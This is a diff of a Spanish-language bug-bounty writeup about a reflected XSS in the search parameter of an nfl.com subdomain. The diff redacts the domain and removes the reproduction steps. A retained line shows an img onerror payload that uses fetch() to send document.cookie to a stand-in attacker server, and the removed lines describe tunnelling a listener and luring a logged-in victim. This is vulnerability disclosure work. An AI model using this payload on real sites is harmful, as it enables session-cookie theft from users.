@@ -22,10 +22,7 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
 
   <div class="bounty-content">
     <h2>🎯 Resumen de la Vulnerabilidad</h2>
-    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>hbcutournament.nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>
-
-    <h2>⚙️ URLs Afectadas</h2>
-    <pre><code>https://hbcutournament.nfl.com/{resources,blogs}?q=</code></pre>
+    <p>Identificamos una vulnerabilidad de Cross-Site Scripting (XSS) reflejado en el dominio público <code>[REDACTED].nfl.com</code>. La vulnerabilidad reside en el parámetro del fragmento de URL de la página de resultados de búsqueda (<code>?q=</code>), que procesa incorrectamente la entrada del usuario sin el saneamiento adecuado.</p>
 
     <h2>🛠️ Payloads de Prueba de Concepto</h2>
     
@@ -44,15 +41,6 @@ official_link: "https://bugcrowd.com/submissions/e8471382-6e56-4e74-b4e2-ff20279
     <pre><code>&lt;img/src/onerror=fetch("http://tu-servidor-web/"+encodeURIComponent(document.cookie))&gt;</code></pre>
     <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration.png" alt="Payload de Exfiltración de Cookies">
     <img src="/assets/images/nfl-xss-search-query/NFL - XSS Search Query Parameter - Cookies Exfiltration Result.png" alt="Resultado de la Exfiltración">
-
-    <h2>🚀 Pasos para Reproducir</h2>
-    <ol>
-      <li>Inicia un servidor web local: <code>python3 -m http.server 8000</code></li>
-      <li>Exponlo públicamente (por ejemplo, usando Serveo): <code>ssh -R 80:localhost:8000 serveo.net</code></li>
-      <li>Prepara la URL maliciosa con la dirección de tu servidor.</li>
-      <li>Comparte la URL con un usuario autenticado.</li>
-      <li>Recibe las cookies de la víctima de nuestro lado.</li>
-    </ol>
 
     <h2>🤝 Detalle de Colaboración</h2>
     <p>Esta investigación fue realizada en un esfuerzo conjunto con los siguientes investigadores:</p>
